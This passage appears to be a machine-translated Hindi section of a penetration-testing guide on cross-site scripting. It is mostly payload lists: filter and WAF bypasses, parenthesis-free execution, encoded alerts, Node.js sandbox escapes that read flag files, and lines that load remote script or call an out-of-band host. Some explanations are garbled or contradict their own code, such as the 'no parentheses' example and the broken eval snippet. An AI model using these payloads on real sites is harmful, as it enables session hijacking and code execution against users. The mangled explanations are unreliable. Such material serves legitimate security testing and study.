यदि आपने वेब के बहुत छोटे हिस्से में एक **एक्सएसएस खोजा है** जिसमें किसी प्रकार का इंटरैक्शन की आवश्यकता होती है (शायद फ़ुटर में एक छोटा लिंक जिसमें onmouseover तत्व हो), तो आप कोशिश कर सकते हैं कि आप **तत्व द्वारा जगह को संशोधित करें** ताकि लिंक चलाने की संभावनाएं बढ़ जाएं।

उदाहरण के लिए, आप तत्व में कुछ स्टाइलिंग जोड़ सकते हैं जैसे: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

लेकिन, यदि WAF स्टाइल एट्रिब्यूट को फ़िल्टर कर रहा है, तो आप CSS स्टाइलिंग गैजेट्स का उपयोग कर सकते हैं, इसलिए यदि आपको, उदाहरण के लिए

> .test {display:block; color: blue; width: 100%\}

और

> \#someid {top: 0; font-family: Tahoma;}

अब आप हमारे लिंक को संशोधित कर सकते हैं और इसे निम्न रूप में लाएं

> \<a href=”” id=someid class=test onclick=alert() a=””>

यह ट्रिक [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703) से ली गई है।

## जावास्क्रिप्ट कोड में इंजेक्शन

इन मामलों में आपका **इनपुट** एक `.js` फ़ाइल या `<script>...</script>` टैग के बीच या जेएस कोड को निष्पादित कर सकने वाले HTML इवेंट्स के बीच या `javascript:` प्रोटोकॉल स्वीकार करने वाले एट्रिब्यूट्स के बीच **फिराया जाएगा**।

### \<script> टैग को एस्केप करना

यदि आपका कोड `<script> [...] var input = 'reflected data' [...] </script>` के भीतर सम्मिलित होता है, तो आप आसानी से **\<script>** टैग को एस्केप कर सकते हैं:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
नोट करें कि इस उदाहरण में हमने **एकल उद्धरण को भी बंद नहीं किया है**, लेकिन यह आवश्यक नहीं है क्योंकि **ब्राउज़र पहले HTML पार्सिंग करता है** ताकि पेज तत्वों को पहचान सके, जिसमें स्क्रिप्ट के ब्लॉक भी शामिल होते हैं, और बाद में ही जावास्क्रिप्ट पार्सिंग करता है ताकि एम्बेडेड स्क्रिप्ट को समझ सके और निष्पादित कर सके।

### JS कोड के अंदर

यदि `<>` सैनिटाइज़ किए जा रहे हैं तो आप अपने इनपुट के स्थान पर **स्ट्रिंग को छोड़ सकते हैं** और **विभिन्न JS को निष्पादित कर सकते हैं**। JS की सिंटैक्स को **ठीक करना महत्वपूर्ण है**, क्योंकि यदि कोई त्रुटि होती है, तो JS कोड निष्पादित नहीं होगा:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### टेम्पलेट लिटरल्स \`\`

**स्ट्रिंग** बनाने के लिए एकल और दोहरे कोटेशन के अलावा JS बैकटिक्स **` `` `** को भी स्वीकार करता है। इसे टेम्पलेट लिटरल्स के रूप में जाना जाता है क्योंकि इसके द्वारा `${ ... }` सिंटैक्स का उपयोग करके **JS व्यक्तियों को सम्मिलित करने** की अनुमति होती है।\
इसलिए, यदि आपको लगता है कि आपका इनपुट एक JS स्ट्रिंग के भीतर **प्रतिबिंबित** हो रहा है जो बैकटिक्स का उपयोग कर रहा है, तो आप `${ ... }` सिंटैक्स का दुरुपयोग करके **विविध JS कोड** को निष्पादित कर सकते हैं:

इसे दुरुपयोग करने के लिए निम्नलिखित का उपयोग किया जा सकता है:
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### कोड को एनकोड करके निष्पादित करना

In some cases, web applications may encode user input before displaying it on the page. This encoding is done to prevent cross-site scripting (XSS) attacks. However, if the application does not properly decode the input before executing it, it may be possible to execute encoded code.

कुछ मामलों में, वेब एप्लिकेशन पेज पर दिखाने से पहले उपयोगकर्ता इनपुट को एनकोड कर सकती है। यह एनकोडिंग क्रॉस-साइट स्क्रिप्टिंग (XSS) हमलों से बचने के लिए की जाती है। हालांकि, यदि एप्लिकेशन इनपुट को सही ढंग से डिकोड नहीं करती है और निष्पादित नहीं करती है, तो एनकोड किए गए कोड को निष्पादित करना संभव हो सकता है।

To exploit this vulnerability, you can try injecting encoded code that will be executed when the application decodes it. This can be done by encoding the code using various techniques such as URL encoding, HTML entity encoding, or JavaScript string encoding.

इस सुरक्षा कमजोरी का उपयोग करने के लिए, आप एनकोड किए गए कोड को इंजेक्शन करने का प्रयास कर सकते हैं जो एप्लिकेशन इसे डिकोड करते समय निष्पादित करेगा। इसे URL एनकोडिंग, HTML एंटिटी एनकोडिंग या JavaScript स्ट्रिंग एनकोडिंग जैसी विभिन्न तकनीकों का उपयोग करके कोड को एनकोड करके किया जा सकता है।

For example, if the application decodes URL-encoded input, you can try injecting code like `%3Cscript%3Ealert('XSS')%3C/script%3E`. When the application decodes this input, it will execute the JavaScript code and display an alert with the message "XSS".

उदाहरण के लिए, यदि एप्लिकेशन URL एनकोडिंग को डिकोड करती है, तो आप `%3Cscript%3Ealert('XSS')%3C/script%3E` जैसे कोड को इंजेक्ट करने का प्रयास कर सकते हैं। जब एप्लिकेशन इस इनपुट को डिकोड करेगी, तो वह जावास्क्रिप्ट कोड को निष्पादित करेगी और "XSS" संदेश के साथ एक अलर्ट प्रदर्शित करेगी।
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### यूनिकोड एन्कोड जेएस एक्सीक्यूशन

यूनिकोड एन्कोड जेएस एक्सीक्यूशन एक क्रॉस-साइट स्क्रिप्टिंग (XSS) तकनीक है जिसमें जेएस कोड को यूनिकोड वर्णों में एन्कोड किया जाता है ताकि उसे वेब ऐप्लिकेशन में अद्यतित करने के दौरान अनुप्रयोग किया जा सके। इस तकनीक का उपयोग करके हैकर एक वेब पेज पर अपने खुद के जेएस कोड को इंजेक्ट कर सकते हैं और उपयोगकर्ता के ब्राउज़र में उसे निष्पादित कर सकते हैं।

यह तकनीक अक्सर वेब ऐप्लिकेशनों में विद्यमान एक्सेस कंट्रोल लिस्ट (ACL) या वेब फ़िल्टर को चुटकियों में उम्मीदवार जेएस कोड को अनुमति देने के लिए उपयोग किया जाता है। इसलिए, यह तकनीक एक अवसर प्रदान करती है कि हैकर अनुमति रद्द करें और अनुप्रयोग को अद्यतित करने के दौरान अपना जेएस कोड निष्पादित करें।

यहां एक उदाहरण है जहां हम एक इनपुट फ़ील्ड में जेएस कोड को एन्कोड करते हैं:

```html
<input type="text" value="javascript:alert('XSS')" />
```

जब उपयोगकर्ता इस इनपुट फ़ील्ड में क्लिक करता है, तो जेएस कोड निष्पादित होता है और एक अलर्ट दिखाई देता है। इस तरह, हैकर एक्सेस कंट्रोल लिस्ट या वेब फ़िल्टर को चुटकियों में उम्मीदवार जेएस कोड को अनुमति देने के लिए इस तकनीक का उपयोग कर सकता है।
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### जावास्क्रिप्ट बाइपास ब्लैकलिस्ट तकनीकें

**स्ट्रिंग्स**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**विशेष एस्केप्स**
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**JS कोड के भीतर स्थान परिवर्तन**

जब हम XSS हमले के लिए एक जावास्क्रिप्ट (JS) कोड लिखते हैं, तो हमें कई बार अंतरिक्ष के बदले अन्य स्थान परिवर्तन करने की आवश्यकता होती है। इसका कारण है कि अंतरिक्ष विभिन्न जावास्क्रिप्ट फंक्शनों और वेरिएबल्स के लिए एक मान्य विशेष चरित्र है। इसलिए, यदि हम अंतरिक्ष का उपयोग करने की कोशिश करेंगे, तो वह जावास्क्रिप्ट कोड को गलत समझेगा और हमारा हमला विफल हो जाएगा।

इस समस्या को हल करने के लिए, हम अंतरिक्ष के बजाय अन्य स्थान परिवर्तन कर सकते हैं, जैसे कि `%20`, `%09`, `%0a` आदि। इन स्थान परिवर्तनों का उपयोग करके, हम जावास्क्रिप्ट कोड को सही ढंग से चला सकते हैं और XSS हमले को सफल बना सकते हैं।

यहां एक उदाहरण है:

```html
<script>
    var payload = 'alert("XSS")';
    eval(payload.replace(/ /g, '%20'));
</script>
```

इस उदाहरण में, हमने `payload` चरित्र स्थान परिवर्तन का उपयोग करके एक XSS हमला बनाया है। जब `eval` फंक्शन को चलाया जाता है, तो वह चरित्रों को अंतरिक्ष के बजाय `%20` के साथ प्रोसेस करेगा। इस प्रकार, हम XSS हमला सफलतापूर्वक चला सकते हैं और "XSS" अलर्ट दिखा सकते हैं।
```javascript
<TAB>
/**/
```
**जावास्क्रिप्ट टिप्पणियाँ (से** [**जावास्क्रिप्ट टिप्पणियाँ**](./#जावास्क्रिप्ट-टिप्पणियाँ) **ट्रिक)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**जावास्क्रिप्ट नई पंक्तियाँ (से** [**जावास्क्रिप्ट नई पंक्ति**](./#जावास्क्रिप्ट-नई-पंक्तियाँ) **ट्रिक)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**जावास्क्रिप्ट व्हाइटस्पेसेस**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**टिप्पणी के भीतर जावास्क्रिप्ट**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript बिना parentheses के**

यदि आपको JavaScript में किसी फ़ंक्शन को कॉल करने के लिए parentheses का उपयोग नहीं करना है, तो आप निम्नलिखित तकनीक का उपयोग कर सकते हैं:

```javascript
// फ़ंक्शन की घोषणा
function myFunction() {
  console.log("Hello, World!");
}

// फ़ंक्शन को कॉल करें
myFunction();
```

इस तरह, आप फ़ंक्शन को बिना parentheses के कॉल कर सकते हैं।
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**अनियमित कार्य (alert) को बुलाओ**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **DOM सुरक्षा दुर्बलताएं**

यहां **JS कोड** है जो **हमेशा संग्रहीत डेटा का उपयोग करता है जिसे हमेशा हमलावर नियंत्रित करता है** जैसे `location.href`. एक हमलावर, इसका दुरुपयोग करके विचित्र JS कोड को निष्पादित कर सकता है।\
**DOM सुरक्षा दुर्बलताओं की विस्तारित व्याख्या के कारण** [**DOM सुरक्षा दुर्बलताओं को इस पेज पर स्थानांतरित किया गया था**](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

वहां आपको एक विस्तृत **व्याख्या मिलेगी कि DOM सुरक्षा दुर्बलताएं क्या हैं, वे कैसे उत्पन्न होती हैं और उन्हें कैसे शोषित किया जाए**।\
इसके अलावा, न भूलें कि **उल्लिखित पोस्ट के अंत में** आप [**DOM Clobbering हमलों के बारे में एक व्याख्या**](dom-xss.md#dom-clobbering) पा सकते हैं।

## अन्य बाइपास

### नॉर्मलाइज़्ड यूनिकोड

आप जांच सकते हैं कि क्या **प्रतिबिंबित मान** सर्वर (या क्लाइंट साइड) में **यूनिकोड मानकीकरण** किया जा रहा है और इस कार्यक्षमता का दुरुपयोग करके सुरक्षा को छलनी कर सकते हैं। [**यहां एक उदाहरण देखें**](../unicode-injection/#xss-cross-site-scripting).

### PHP FILTER\_VALIDATE\_EMAIL फ़्लैग बाइपास
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails बाईपास

**RoR मास असाइनमेंट** के कारण उद्धृत अवधारणा HTML में सम्मिलित की जाती है और फिर उद्धृत अवधारणा को बाईपास करके टैग के अंदर अतिरिक्त फ़ील्ड (onfocus) जोड़े जा सकते हैं।\
उदाहरण के लिए ([इस रिपोर्ट से](https://hackerone.com/reports/709336)), अगर आप पेलोड भेजते हैं:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
जोड़ "कुंजी", "मान" वापस ऐसे ही दिखाया जाएगा:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
फिर, onfocus गुणांक डाला जाएगा:

![](<../../.gitbook/assets/image (107).png>)

एक XSS होता है.

### विशेष संयोजन
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS के साथ हेडर इंजेक्शन 302 प्रतिक्रिया में

यदि आपको पता चलता है कि आप **302 पुनर्निर्देशन प्रतिक्रिया में हेडर्स इंजेक्शन कर सकते हैं**, तो आप कोशिश कर सकते हैं कि **ब्राउज़र विभिन्नता जावास्क्रिप्ट को निष्पादित करें**। यह **सरल नहीं** है क्योंकि आधुनिक ब्राउज़र्स HTTP प्रतिक्रिया स्थिति कोड 302 होने पर HTTP प्रतिक्रिया बॉडी का व्याख्यान नहीं करते हैं, इसलिए केवल क्रॉस-साइट स्क्रिप्टिंग पेलोड व्यर्थ होता है।

[**इस रिपोर्ट**](https://www.gremwell.com/firefox-xss-302) और [**इस रिपोर्ट**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) में आप पढ़ सकते हैं कि आप कैसे लोकेशन हेडर के अंदर के क्रॉस-साइट स्क्रिप्टिंग पेलोड को जांच और निष्पादित करने के लिए कई प्रोटोकॉल्स का परीक्षण कर सकते हैं।\
पिछले ज्ञात प्रोटोकॉल: `mailto://`, `//x:1/`, `ws://`, `wss://`, _खाली लोकेशन हेडर_, `resource://`.

### केवल अक्षर, संख्या और डॉट

यदि आप **कॉलबैक** को इंगित कर सकते हैं कि जावास्क्रिप्ट किस चरित्रों को **निष्पादित** करेगा, तो [**इस पोस्ट के इस खंड**](./#javascript-function) को पढ़ें और इस व्यवहार का दुरुपयोग कैसे करें।

### XSS के लिए मान्य `<script>` कंटेंट-टाइप्स

(यहां से [**यहां**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/) से) यदि आप `application/octet-stream` जैसे **कंटेंट-टाइप** के साथ एक स्क्रिप्ट लोड करने की कोशिश करते हैं, तो Chrome निम्नलिखित त्रुटि देगा:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

केवल वे **कंटेंट-टाइप** हैं जिनका समर्थन करेगा Chrome एक **लोड किए गए स्क्रिप्ट** को, जो [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc) में स्थित हैं const **`kSupportedJavascriptTypes`** के भीतर हैं।
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSS के लिए स्क्रिप्ट प्रकार

(यहां से [**यहां**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/) से) तो, कौन से प्रकार स्क्रिप्ट लोड करने के लिए इंगित किए जा सकते हैं?
```html
<script type="???"></script>
```
उत्तर है:

* **मॉड्यूल** (डिफ़ॉल्ट, कुछ समझाने की आवश्यकता नहीं है)
* [**वेबबंडल**](https://web.dev/web-bundles/): वेबबंडल एक सुविधा है जिसके द्वारा आप डेटा (HTML, CSS, JS...) को एक साथ पैकेज कर सकते हैं और एक **`.wbn`** फ़ाइल में रख सकते हैं।
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* [**importmap**](https://github.com/WICG/import-maps)**:** इंपोर्ट सिंटेक्स को सुधारने की अनुमति देता है।
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
इस व्यवहार का उपयोग [**इस लेख**](https://github.com/zwade/yaca/tree/master/solution) में किया गया था ताकि एक पुस्तकालय को रीमैप करके इसे दुरुपयोग करें और इसे XSS को ट्रिगर करें।

* [**speculationrules**](https://github.com/WICG/nav-speculation)**:** यह सुविधा मुख्य रूप से प्री-रेंडरिंग द्वारा कुछ समस्याओं को हल करने के लिए है। यह इस प्रकार काम करता है:
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### XSS के लिए वेब सामग्री प्रकार

(यहां से [**यहां**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/) से) निम्नलिखित सामग्री प्रकार सभी ब्राउज़र में XSS को क्रियान्वित कर सकते हैं:

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? सूची में नहीं है, लेकिन मुझे लगता है मैंने इसे CTF में देखा था)
* application/rss+xml (बंद)
* application/atom+xml (बंद)

अन्य ब्राउज़रों में अन्य **`Content-Types`** का उपयोग करके अनियमित JS को क्रियान्वित किया जा सकता है, जांचें: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml सामग्री प्रकार

यदि पृष्ठ एक text/xml सामग्री प्रकार लौटा रहा है, तो नेमस्पेस की घोषणा करना संभव है और अनियमित JS को क्रियान्वित करना संभव है:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### विशेष प्रतिस्थापन पैटर्न

जब कुछ ऐसा होता है जैसे **`"कुछ {{टेम्पलेट}} डेटा".replace("{{टेम्पलेट}}", <उपयोगकर्ता_इनपुट>)`** इस्तेमाल होता है। हमलावर्द व्यक्ति [**विशेष स्ट्रिंग प्रतिस्थापन**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement) का उपयोग करके कुछ सुरक्षा को दौर करने का प्रयास कर सकता है: ``"123 {{टेम्पलेट}} 456".replace("{{टेम्पलेट}}", JSON.stringify({"नाम": "$'$`alert(1)//"}))``

उदाहरण के लिए [**इस लेख में**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), इसका उपयोग किया गया था **एक स्क्रिप्ट के भीतर एक JSON स्ट्रिंग को छोड़ने** और विचित्र कोड को निष्पादित करने के लिए।

### Chrome कैश से XSS

{% content-ref url="chrome-cache-to-xss.md" %}
[chrome-cache-to-xss.md](chrome-cache-to-xss.md)
{% endcontent-ref %}

### XS Jails से बाहर निकलें

यदि आपके पास केवल सीमित संख्या के वर्ण ही उपयोग करने की सुविधा है, तो XSJail समस्याओं के लिए इन अन्य मान्य समाधानों की जांच करें:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
यदि **सब कुछ अपरिभाषित होता है** अविश्वसनीय कोड को निष्पादित करने से पहले (जैसे [**इस लेख**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves) में), तो यह संभव है कि निष्पादित अनिश्वशित कोड के निष्पादन का दुरुपयोग करने के लिए "बिना कुछ के" उपयोगी ऑब्जेक्ट उत्पन्न किए जाएं:

* import() का उपयोग करके
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```
* `require` का अप्रत्यक्ष उपयोग करना

[इसके अनुसार](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) मॉड्यूल्स को Node.js द्वारा एक फ़ंक्शन के भीतर लपेटा जाता है, जैसे:
```javascript
(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
```
इसलिए, अगर हम उस मॉड्यूल से **एक और फंक्शन को कॉल कर सकते हैं**, तो उस फंक्शन से `arguments.callee.caller.arguments[1]` का उपयोग करके **`require`** तक पहुंचना संभव है:&#x20;

{% code overflow="wrap" %}
```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```
{% endcode %}

पिछले उदाहरण की तरह, **त्रुटि हैंडलर** का उपयोग करके मॉड्यूल के **व्रैपर** तक पहुंचने और **`require`** फ़ंक्शन प्राप्त करने का संभावना होता है:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
